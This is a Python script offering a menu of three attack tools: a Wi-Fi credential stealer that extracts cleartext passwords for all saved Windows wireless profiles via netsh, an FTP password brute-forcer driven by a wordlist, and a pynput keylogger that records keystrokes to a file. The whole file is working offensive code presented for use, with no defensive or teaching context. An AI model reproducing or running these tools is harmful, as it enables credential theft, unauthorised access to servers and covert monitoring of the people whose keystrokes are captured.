import subprocess
import re
from ftplib import FTP  # a class to implement the ftp client side
from colorama import Fore  # for printing fancy colors on terminal
from pynput.keyboard import Listener


def wifi_password_stealer():
    command_output = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True).stdout.decode()
    # using regular expressions to grep the string we want from the above command output and save it into a variable
    profile_names = set(re.findall(r"All User Profile\s*:(.*)", command_output))
    # this will store the Wi-Fi ssids and their corresponding password(ssid: password)
    wifi_data = ""

    # iterate through the profile names
    for profile in profile_names:

        # remove trailing whitespaces and newline characters
        profile = profile.strip()

        # show the profile details together with the clear text password
        profile_info = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"],
                                      capture_output=True).stdout.decode()

        # use regular expressions to search for the password
        profile_password = re.findall(r"Key Content\s*:(.*)", profile_info)

        # check to see if the profile has password
        if len(profile_password) == 0:
            wifi_data += f"{profile}: Open\n"
        else:
            wifi_data += f"{profile}: {profile_password[0].strip()}\n"

    # save the Wi-Fi details in a file
    with open("wifi.txt", "w") as file:
        file.write(wifi_data)


def brute_forcer():
    host = input("Enter the hostname/ip: ")
    # username of the FTP server, root as default for linux
    username = input("Enter the username: ")

    # the file which contains a list of possible password
    passwordlist = input("Enter the filename/path of the wordlist: ")

    def check_anon_login(host):
        try:
            with FTP(host) as ftp:
                # trying anonymous credentials
                ftp.login()  # user anonymous, passwd anonymous@

                # return true if the server allows anonymous login
                return True
        except Exception as err:
            print(err)
            # otherwise return false
            return False

    def ftp_buster(host, username, passwordlist):
        # open the password-list file and read the passwords
        with open(passwordlist, "r") as passwd_file:
            # iterate over passwords one by one
            # if the password is found, break out of the loop
            for password in passwd_file.readlines():
                password = password.strip()
                with FTP(host=host, timeout=0.1) as ftp:
                    try:
                        ftp.login(user=username, passwd=password)
                        print(f"{Fore.GREEN}Password Found: {password}", Fore.RESET)
                        break
                    except Exception as e:
                        print(f"Trying...:{password}", e)
                        continue

    # check if our ftp server accepts anonymous login, if not we try to brute force the password using the ftp_buster
    # function
    if check_anon_login(host=host):
        print("logged In")
    else:
        print("Anonymous login failed, Trying to brute force the password")
        ftp_buster(host=host, username=username, passwordlist=passwordlist)


def key_logger():
    keys = []

    def on_keypress(key):
        # appending the pressed key into the keys list
        keys.append(key)
        # iterate through each key in a list and call the log_keys function
        # which takes the key as an argument
        for key in keys:
            log_keys(key)

    # a helper function which logs the pressed key into a file
    def log_keys(key):
        # opening a file to append the pressed key
        with open("keys.log", 'a') as logfile:
            # removing unwanted strings from our pressed key
            key = str(key).replace("'", "")
            # check to see if the pressed key has a certain text/string
            # if true/ > 0 we replace it with the required value
            # otherwise we just append it into the file as it is
            if key.find("backspace") > 0:
                logfile.write(" backspace ")
            elif key.find("space") > 0:
                logfile.write(" ")
            elif key.find("shift") > 0:
                logfile.write(" shift ")
            elif key.find("enter") > 0:
                logfile.write("\n")
            elif key.find("caps_lock") > 0:
                logfile.write(" capslock ")
            else:
                logfile.write(key)
            # finally we cleared our global keys list, so that we don't have key
            # duplicates appended in the file. the next time we press another key
            keys.clear()

    with Listener(on_press=on_keypress) as listener:
        listener.join()


def run():
    option = int(input("Enter the module to run: "))
    if option == 1:
        wifi_password_stealer()
    elif option == 2:
        brute_forcer()
    elif option == 3:
        key_logger()


run()
